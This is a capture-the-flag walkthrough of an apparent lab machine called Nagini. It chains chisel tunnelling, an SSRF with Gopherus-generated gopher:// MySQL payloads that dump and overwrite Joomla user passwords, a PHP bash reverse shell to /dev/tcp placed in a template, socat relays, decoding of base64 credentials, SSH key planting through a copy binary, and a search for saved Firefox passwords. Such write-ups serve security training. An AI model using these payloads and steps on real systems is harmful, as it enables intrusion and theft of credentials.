example here's an example of how to set [foxyProxy](https://github.com/Zeekk3n/FoxyProxy) in case, if you don't know how to set it

now how we can enumerate that port 80 we will search for possible routes using go buster 

- With gobuster would be:

```bash
❯ proxychains gobuster dir -u http://10.10.0.137 -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -x html,php,txt --proxy socks5://127.0.0.1:1080
ProxyChains-3.1 (http://proxychains.sf.net)

take under consideration that you have always to use this parameter in order to target the tunneling made with chisel --proxy socks5://127.0.0.1:1080

```

and we found 2 interesting things, from the page output:

```bash
/index.html           (Status: 200) [Size: 97]
/note.txt             (Status: 200) [Size: 234]
/joomla               (Status: 301) [Size: 311] [--> http://10.10.0.137/joomla/]
/server-status        (Status: 403) [Size: 276]                                 
Progress: 1397916 / 5095336 (27.44%)          
```



let's enumerate them.
http://10.10.0.137/note.txt
output

```bash
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin

``````
let's enumerate them.



so we have to use a tool in order to enumerate a http3 service http3 usually work on 443 port 
http://10.10.0.137/joomla  

installation
1
```bash
 git clone --recursive https://github.com/cloudflare/quiche
``````

2

```bash
curl https://sh.rustup.rs -sSf | sh
```
3

```bash
1) Proceed with installation (default)
2) Customize installation
3) Cancel installation
>1
```
4
```bash
source "$HOME/.cargo/env"
```

5

```bash
❯ rustup update
```
6

tool
```bash
❯ rustup update
```
last steps

```bash
❯ cargo build --examples
```
testing the cargo 

1
```bash
❯ cargo tests
```
2

```bash
❯ cargo tests
```
how to use it, once we set it 

we have to bring another ports in order to scan it, which is the 443 port for http3

```bash
bash-5.0$ ./chisel.sh client 192.168.100.53:1234 R:socks R:443:10.10.0.137:443/udp
```
first of all we need to use the binary called http3-client here's is the path
cd quiche/target/debug/examples

now execute it using the tool for http3

```bash
❯ ./http3-client https://127.0.0.1
```
output
```bash
❯ ./http3-client https://127.0.0.1
<html>
	<head>
	<title>Information Page</title>
	</head>
	<body>
		Greetings Developers!!
		
		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	</body>
</html>
```
seems that we found a route for the machine 10.10.0.137
```bash
let's find possible CVE's or pluglins for that route
```
usage 
remember to turn on the foxyproxy in order to dig that page

```php
<html>
<head>
	<title>Resource Fetching Page</title>
	<meta charset="utf-8">
</head>
<body>
	<center><h1>Welcome to Internal Network Resource Fetching Page</h1></center>
	<br><br>

	<form action="/internalResourceFeTcher.php" method="GET">
	<center><input type="text" name="url" value="" id='url'>
	<input type="submit" value="Fetch"></center>
	</form>
</body>

<html>
<body>
<img src="harry_potter_2.jpg" style='height: 100%; width: 100%; '>
</body>
</html>

```

that page is using the parameter ```GET``` so it has a vulnerability of Server side request forgery 
using the search bar let's try it 

first of all we need to use 2 connections the ssh port that we made using the key gen and the reverse shell that we made for hagri98 

on our tunneling made with sshpor22 we have to stay using this command 

```bash
root@Aragog:/dev/shm# ./chisel.sh client 192.168.100.53:1324 R:socks
```
and for the reverse shell we will use socat in order to download we just have to get them from github, example 

```bash
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
```

then just click in download tab

and share it with python3 

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.65 - - [23/Apr/2023 16:12:06] "GET /socat HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```
get it from the reverse shell 

```
wget 192.168.100.53:80/socat
```
give it execution permissions

```
chmod +x socat
```

execute it from the reverse shell (i recommend you to open a new terminal of hagrid98 with sudo privileges)

```
bash-5.0# ./socat TCP-LISTEN:4343,fork TCP:192.168.100.53:80 
```
Where.:

- ```-TCP-LISTEN``` : stay listen at all the flow of information that comes from port 4343
- ```-4343``` : that comes from port 4343.
- ```-fork```: execute a redireccion of all that information that comes from port 4343.
- ```-TCP:192.168.100.53:80```: send it to 192.168.100.53 via tcp to  port 80

saying this now we have to listing at port 80 in order to get all fork of information that comes from socat

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)...
```

going back to the port 80 of 10.10.0.137
we have to request to the local host the information from our machine which is listining at 192.168.100.53:80 (remeber that this is possible because it's 
is vulnerable to ssrf)

in the search bar we have to search this (the ip of hagrid98 because there's the socat tunneling)

```bash
http://10.10.0.137:4343
```
and seems that it works nevetheless it's not interpreting php code, because i was trying to upload a command line using php
```php
<?
system("whoami")
?>
```
checking the page it's not interpreting php code
```php
<html>
<head>
	<title>Resource Fetching Page</title>
	<meta charset="utf-8">
</head>
<body>
	<center><h1>Welcome to Internal Network Resource Fetching Page</h1></center>
	<br><br>

	<form action="/internalResourceFeTcher.php" method="GET">
	<center><input type="text" name="url" value="" id='url'>
	<input type="submit" value="Fetch"></center>
	</form>
</body>

```


let's check joomla service that we found with gobuzzter

to check if it has vulnerabilities let's use [jomcheck](https://github.com/rezasp/joomscan.git)


```bash
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
```
now let's use it 

```bash
$ proxychains perl joomscan.pl -u http://10.10.0.137/joomla/ 2>&/dev/null
```

Where.:

- ```-proxychains``` :in order to use the  tunneling made on port 1080 using chisel client + chisel server on port 1080.
- ```-u``` : We will run all relevant scripts (provided by nmap) on these ports.
- ```-2>&/dev/null```: readict all error output to de/null which is like a black hole

output



```bash
 ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.0.137/joomla/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.25

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.0.137/joomla/administrator/components
http://10.10.0.137/joomla/administrator/modules
http://10.10.0.137/joomla/administrator/templates
http://10.10.0.137/joomla/tmp
http://10.10.0.137/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.0.137/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.0.137/joomla/robots.txt 

Interesting path found from robots.txt
http://10.10.0.137/joomla/joomla/administrator/
http://10.10.0.137/joomla/administrator/
http://10.10.0.137/joomla/bin/
http://10.10.0.137/joomla/cache/
http://10.10.0.137/joomla/cli/
http://10.10.0.137/joomla/components/
http://10.10.0.137/joomla/includes/
http://10.10.0.137/joomla/installation/
http://10.10.0.137/joomla/language/
http://10.10.0.137/joomla/layouts/
http://10.10.0.137/joomla/libraries/
http://10.10.0.137/joomla/logs/
http://10.10.0.137/joomla/modules/
http://10.10.0.137/joomla/plugins/
http://10.10.0.137/joomla/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config file is found 
 config file path : http://10.10.0.137/joomla/configuration.php.bak



Your Report : reports/10.10.0.137/

```

important output
Interesting path found from robots.txt
http://10.10.0.137/joomla/joomla/administrator/
http://10.10.0.137/joomla/administrator/
http://10.10.0.137/joomla/bin/
http://10.10.0.137/joomla/cache/
http://10.10.0.137/joomla/cli/
http://10.10.0.137/joomla/components/
http://10.10.0.137/joomla/includes/
http://10.10.0.137/joomla/installation/
http://10.10.0.137/joomla/language/
http://10.10.0.137/joomla/layouts/
http://10.10.0.137/joomla/libraries/
http://10.10.0.137/joomla/logs/
http://10.10.0.137/joomla/modules/
http://10.10.0.137/joomla/plugins/
http://10.10.0.137/joomla/tmp/

another very strong point to mention is 

 config file path : http://10.10.0.137/joomla/configuration.php.bak

let's check it on port 80 remember to turn on the FoxyProxy

in this file we figure out a few things, this loggin panel and

```bash
in port 80 Interesting path found from robots.txt
http://10.10.0.137/joomla/joomla/administrator/
http://10.10.0.137/joomla/administrator/
```

a possible credentials in the http://10.10.0.137/joomla/configuration.php.bak


```php
❯ cat configuration.php.bak
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: configuration.php.bak
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │ class JConfig {
   3   │     public $offline = '0';
   4   │     public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
   5   │     public $display_offline_message = '1';
   6   │     public $offline_image = '';
   7   │     public $sitename = 'Joomla CMS';
   8   │     public $editor = 'tinymce';
   9   │     public $captcha = '0';
  10   │     public $list_limit = '20';
  11   │     public $access = '1';
  12   │     public $debug = '0';
  13   │     public $debug_lang = '0';
  14   │     public $debug_lang_const = '1';
  15   │     public $dbtype = 'mysqli';
  16   │     public $host = 'localhost';
  17   │     public $user = 'goblin';
  18   │     public $password = '';
  19   │     public $db = 'joomla';
  20   │     public $dbprefix = 'joomla_';
  21   │     public $live_site = '';
  22   │     public $secret = 'ILhwP6HTYKcN7qMh';
  23   │     public $gzip = '0';
  24   │     public $error_reporting = 'default';
  25   │     public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
  26   │     public $ftp_host = '';
  27   │     public $ftp_port = '';
  28   │     public $ftp_user = '';
  29   │     public $ftp_pass = '';
  30   │     public $ftp_root = '';
  31   │     public $ftp_enable = '0';
  32   │     public $offset = 'UTC';
  33   │     public $mailonline = '1';
  34   │     public $mailer = 'mail';
  35   │     public $mailfrom = 'site_admin@nagini.hogwarts';
  36   │     public $fromname = 'Joomla CMS';
  37   │     public $sendmail = '/usr/sbin/sendmail';
  38   │     public $smtpauth = '0';
  39   │     public $smtpuser = '';
  40   │     public $smtppass = '';
  41   │     public $smtphost = 'localhost';
  42   │     public $smtpsecure = 'none';
  43   │     public $smtpport = '25';
  44   │     public $caching = '0';
  45   │     public $cache_handler = 'file';
  46   │     public $cachetime = '15';
  47   │     public $cache_platformprefix = '0';
  48   │     public $MetaDesc = '';
  49   │     public $MetaKeys = '';
  50   │     public $MetaTitle = '1';
  51   │     public $MetaAuthor = '1';
  52   │     public $MetaVersion = '0';
  53   │     public $robots = '';
  54   │     public $sef = '1';
  55   │     public $sef_rewrite = '0';
  56   │     public $sef_suffix = '0';
  57   │     public $unicodeslugs = '0';
  58   │     public $feed_limit = '10';
  59   │     public $feed_email = 'none';
  60   │     public $log_path = '/var/www/html/joomla/administrator/logs';
  61   │     public $tmp_path = '/var/www/html/joomla/tmp';
  62   │     public $lifetime = '15';
  63   │     public $session_handler = 'database';
  64   │     public $shared_session = '0';
  65   │ }
───────┴───
```
seems that we have sql user, we can actually take an adventage of the ssrf, because if we use gopherus we can dig in to the data bases, this works only if the databases, don't have the password set it, let's figure out

let's install gopherus 
get it from [github](https://github.com/tarunkant/Gopherus)

```bash
❯ git clone https://github.com/tarunkant/Gopherus
Clonando en 'Gopherus'...
remote: Enumerating objects: 137, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 137 (delta 12), reused 11 (delta 11), pack-reused 122
Recibiendo objetos: 100% (137/137), 285.89 KiB | 510.00 KiB/s, listo.
Resolviendo deltas: 100% (65/65), listo.
```

installation


```bash
❯ ./install.sh
/usr/bin/python2: No module named pip
/usr/bin/python2: No module named pip
```
in case you don't have pip2 module let's install it

```bash
❯ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
```
now let's install it 
```bash
❯ ./install.sh
```
usage

we just have to send te command gopherus  in this case we saw that is SQL, but gopherus support mysql, postgresql, fastcgi, redis, smtp, zabbix etc.

```bash
❯ gopherus


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

usage: gopherus [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
None

```
we have to select mysql in this case Gopherus will ask us the username for the data bases in our case is goblin because of the archive.bak

```bash
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: 
```

after we select the username gopherus will ask us for the query to execute. as usual we need to know first of all, the databases so we will ask gopherus to make a URL to explete the SSRF

```bash
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: SHOW databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%53%48%4f%57%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```
we will take the url that gopherus provide us and paste it in the search bar on the ssrf that we saw before in /internalResourceFeTcher.php(remember  to turn on the foxyProxy)

output (to make it work it we have to recharge the page like 7 times, FYI) it's normal in this kind of SSRF)
```bash
information_schemajoomla
```

so we can enumerate the databases let's follow our metodology, now we have to get the tables, we have to use the joomla databases to enumerate the tables

```bash
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; show tables;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01

output
c 5.5.5-10.3.27-MariaDB-0+deb10u1M0{=]>[1#��-��Ywl9rU3?!)Fgmysql_native_password @ joomlaXdefinformation_schemaTABLE_NAMESTABLE_NAMESTables_in_joomla 

TABLE_NAME!��joomla_action_log_configjoomla_action_logsjoomla_action_logs_extensionsjoomla_action_logs_users joomla_assets joomla_associations joomla_banner_clientsjoomla_banner_tracksjoomla_banners joomla_categoriesjoomla_contact_detailsjoomla_contentjoomla_content_frontpagejoomla_content_ratingjoomla_content_typesjoomla_contentitem_tag_mapjoomla_core_log_searchesjoomla_extensions joomla_fieldsjoomla_fields_categoriesjoomla_fields_groupsjoomla_fields_valuesjoomla_finder_filtersjoomla_finder_linksjoomla_finder_links_terms0joomla_finder_links_terms1joomla_finder_links_terms2joomla_finder_links_terms3 joomla_finder_links_terms4!joomla_finder_links_terms5"joomla_finder_links_terms6#joomla_finder_links_terms7$joomla_finder_links_terms8%joomla_finder_links_terms9&joomla_finder_links_termsa'joomla_finder_links_termsb(joomla_finder_links_termsc)joomla_finder_links_termsd*joomla_finder_links_termse+joomla_finder_links_termsf,joomla_finder_taxonomy-joomla_finder_taxonomy_map.joomla_finder_terms/joomla_finder_terms_common0joomla_finder_tokens1joomla_finder_tokens_aggregate2joomla_finder_types3joomla_languages4joomla_menu5joomla_menu_types6joomla_messages7joomla_messages_cfg8joomla_modules9joomla_modules_menu:joomla_newsfeeds;joomla_overrider<joomla_postinstall_messages=joomla_privacy_consents>joomla_privacy_requests?joomla_redirect_links@joomla_schemasAjoomla_sessionBjoomla_tagsCjoomla_template_stylesDjoomla_ucm_baseEjoomla_ucm_contentFjoomla_ucm_historyGjoomla_update_sitesHjoomla_update_sites_extensionsIjoomla_updatesJjoomla_user_keysKjoomla_user_notesLjoomla_user_profilesMjoomla_user_usergroup_mapNjoomla_usergroups Ojoomla_usersPjoomla_utf8_conversionQjoomla_viewlevelsR�"

important we have to enumerate the joomla_users to enumerate the users for the table joomla 

```
now let's get the columns 

```bash
  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; describe joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%23%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%64%65%73%63%72%69%62%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------


```
for the data will be 
```bash
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; select name,username,email,password from joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%43%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%6e%61%6d%65%2c%75%73%65%72%6e%61%6d%65%2c%65%6d%61%69%6c%2c%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

```
we found the password and the user for this database but we found a password hashed let's try to Bruteforce it with john 


```bash
�n Super User site_adminsite_admin@nagini.hogwarts<$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay�"
```
how to bruteForce it using john 



```bash
❯ john -w:rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:06:48 0,23% (ETA: 2023-04-26 21:39) 0g/s 98.89p/s 98.89c/s 98.89C/s abygail..DYLAN
Session aborted
```

but we will unable to bruteforce it nevertheless, we can watch data from joomla_users let's try to manipulate first of all we need to create a hash with md5sum example

a
```bash
❯ echo -n "contra123" | md5sum
2109273d6457e96abbe8fb88bf62c074
```
now let's play with gophirus to change the password for user "site_admin"

a
```bash
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: Use joomla; update joomla_users set password='2109273d6457e96abbe8fb88bf62c074' where username='site_admin';

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%55%73%65%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%32%31%30%39%32%37%33%64%36%34%35%37%65%39%36%61%62%62%65%38%66%62%38%38%62%66%36%32%63%30%37%34%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01

it worked  c 5.5.5-10.3.27-MariaDB-0+deb10u1][(VX7GAN��-��FQHRFGnw-u+qmysql_native_password @ joomla0(Rows matched: 1 Changed: 0 Warnings: 0


```

let's try it in the loggin panel 
```bash
crendials=site_admin:contra123
```

and it worked 

let's explote joomla 

## Gaining Access | 10.10.0.137

when you are in a joomla panel the gaining access if easy because if you go at extensions >> templates>> select propostar template >> and you edit the error.php

if you edit it and if you add a php malisius code if you generate an error joomla will read your malisius code in my case i will add a reverse shell in php format and i will generate an error using the index.php

remember to use socat in order to tell them that fork all info that comes from 10.10.0.137 send it to my own machine 

example 
go to 

```bash
extensions >> templates>> select propostar template >> and you edit the error.php 
```
add your reverse shell 

```bash
system("bash -c 'bash -i >& /dev/tcp/10.10.0.136/1111 0>&1'");
```

save it and stay listen with nc -nlpv 443

with socat as well

```bash
^Croot@Aragog:/dev/shm# ./socat TCP-LISTEN:1111,fork TCP:192.168.100.53:443
```

and generate an error using the index.php on the joomla 

```bash
http://10.10.0.137/joomla/index.php/<>
```

whoami 


```bash
www-data@Nagini:/var/www/html/joomla$ whoami
www-data
```

# Privilage Escalation | 10.10.0.137

First of all we need to find ways of escalate to root 

```bash
www-data@Nagini:/var/www/html/joomla$ whoami
www-data
```
here we found an users named hermoine, snape and a archive called .creds.txt
```bash
www-data@Nagini:/$ cd /home/
www-data@Nagini:/home$ ls
hermoine  snape
www-data@Nagini:/home$ cd snape/
www-data@Nagini:/home/snape$ ls
www-data@Nagini:/home/snape$ ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
www-data@Nagini:/home/snape$ 
```
let's check it 
```bash
www-data@Nagini:/$ cd /home/
www-data@Nagini:/home$ ls
hermoine  snape
www-data@Nagini:/home$ cd snape/
www-data@Nagini:/home/snape$ ls
www-data@Nagini:/home/snape$ ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
www-data@Nagini:/home/snape$ cat .creds.txt 
TG92ZUBsaWxseQ==
www-data@Nagini:/home/snape$ echo "TG92ZUBsaWxseQ==" | base64 -d;echo            
Love@lilly
www-data@Nagini:/home/snape$ su snape
Password: 
snape@Nagini:~$ whoami
snape
snape@Nagini:~$ 
```
that was an easy way to get the credentials for snape let's find a way to be root

we can try a technique called user pivoting which is basically to get access to another user into the same environment 


```bash
snape@Nagini:/var/www/html/joomla$ cd /home/hermoine/
snape@Nagini:/home/hermoine$ ls
bin  horcrux2.txt
snape@Nagini:/home/hermoine$ cd bin/
snape@Nagini:/home/hermoine/bin$ ls
su_cp
```
we found a binarie called su_cp am able to use cp with  hermoine user so let's upload the id_rsa_pub in .ssh file of hermione to get access without password

```bash
snape@Nagini:/home/hermoine/bin$ nano /tmp/authorized_keys
snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized_keys /home/hermoine/.ssh/authorized_keys 
```

```bash
❯ proxychains ssh hermione@10.10.0.137
hermione@Nagini:~$ whoami
hermione
```

in hermoine desktop we found a critical directory called mozilla 

```bash
hermoine@Nagini:~$ ls -la
total 28
drwxr-xr-x 6 hermoine hermoine 4096 Apr  4  2021 .
drwxr-xr-x 4 root     root     4096 Apr  4  2021 ..
drwx------ 3 hermoine hermoine 4096 Apr  4  2021 .gnupg
drwx------ 5 hermoine hermoine 4096 Jun  1  2019 .mozilla
drwxr-xr-x 2 hermoine hermoine 4096 May  1 21:35 .ssh
drwxr-xr-x 2 hermoine hermoine 4096 Apr  4  2021 bin
-r--r----- 1 hermoine hermoine   75 Apr  4  2021 horcrux2.txt
```
let's try to get the passwords of .mozilla because sometimes users save their passwords in that directory 
```bash
hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ ls
AlternateServices.txt	     blocklist.xml		containers.json        extension-preferences.json  gmp		      logins.json	  prefs.js		 sessionCheckpoints.json	     times.json
